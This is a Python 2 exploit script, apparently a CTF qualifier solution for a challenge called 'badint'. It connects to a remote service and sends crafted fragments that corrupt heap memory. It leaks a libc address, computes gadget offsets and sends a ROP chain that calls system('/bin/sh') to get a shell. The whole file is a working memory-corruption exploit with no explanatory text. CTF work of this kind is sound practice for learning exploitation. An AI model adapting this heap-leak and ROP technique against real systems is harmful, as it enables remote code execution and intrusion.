from pwnlib import *

# All ints are not the same... A239... Some can be bad ints!

# remote:
# atol: 0x7f2f07cebf70
# alarm: 0x7f2f07d72cd0


#s = Socket(("localhost", 6767))
s = Socket(("badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me", 21813))
s.ru("SEQ #: ")


def frag(seqno, offset, data, final=False):
	print "frag", seqno
	s.send("%d\n" % seqno)
	s.ru("Offset: ")
	s.send("%d\n" % offset)
	s.ru("Data: ")
	s.send("%s\n" % data.encode("hex"))
	s.ru("F Yes/No: ")
	if final:
		s.send("Yes\n")
		s.ru("]: ")
		result = s.ru("\n").decode("hex")
	else:
		s.send("No\n")
		result = ""
	s.ru("SEQ #: ")
	return result

frag(0, 0, "A"*0x40)
frag(0, 0, "A"*0x40)
frag(0, 0, "A"*0x40)
frag(0, 0, "A"*0x40)
frag(1, 0, "A"*0x28)
frag(2, 0, "A"*0x40)
frag(0, 0, "A"*0x40, True)
frag(1, 0x270, pq(0x604068-8), True)

leaked = frag(2, 0, "X", True)

alarm = uq(leaked[32:40])
libc_base = alarm - 0xc0cd0
assert libc_base & 0xfff == 0

frag(7, 0, "F"*0xf0)
frag(7, 0, "G"*0xf0)


frag(4, 0, "B"*0x10)
frag(4, 0, "B"*0x10)
frag(4, 0, "B"*0x10)
frag(4, 0, "B"*0x10)
frag(5, 0, "A"*0x10)
frag(6, 0, "A"*0x40)
frag(6, 0, "A"*0x40)
frag(6, 0, "A"*0x40)
frag(7, 0, "C"*0x60)

frag(4, 0, "B"*0x20, True)


target = libc_base + 0x3be735
frag(5, 0x740, pq(target - 8) + pq(0xdeaddead), True)

system = libc_base + 0x46640
pop_rdi = libc_base + 0x0000000000022b1a
pivot = libc_base + 0x0000000000036c6a
ret = libc_base + 0x0000000000000937
bin_sh = libc_base + 0x17ccdb

payload = "A"*3
payload += pq(pivot)
payload += "B"*(0x60 - len(payload))


frag(7, 0, payload)

raw_input("> ")



seqno = 7
offset = 0

data = payload.encode("Hex")
data += "\x00"*8
data += pq(ret)*0x20
data += pq(pop_rdi)
data += pq(bin_sh)
data += pq(system)

s.send("%d\n" % seqno)
s.ru("Offset: ")
s.send("%d\n" % offset)
s.ru("Data: ")
s.send("%s\n" % data)

s.codegen()

